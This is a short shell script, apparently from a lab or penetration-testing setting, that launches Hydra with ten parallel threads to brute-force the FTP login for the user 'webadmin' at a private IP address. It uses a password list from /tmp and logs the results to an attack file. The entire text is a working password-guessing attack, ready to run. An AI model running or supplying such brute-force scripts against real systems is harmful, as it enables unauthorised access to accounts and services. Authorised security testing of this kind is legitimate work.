#!/bin/sh

##############################################################
# FTP Bruteforce with hydra
# Ing. Alexander Poschenreithner, 2017
##############################################################

# attack FTP
echo "     => Starting Hydra with 10 heads on FTP"
sudo hydra -t 10 -l webadmin -P /tmp/passwordlist_1.txt -vV 10.11.12.10 ftp >> /tmp/attack.log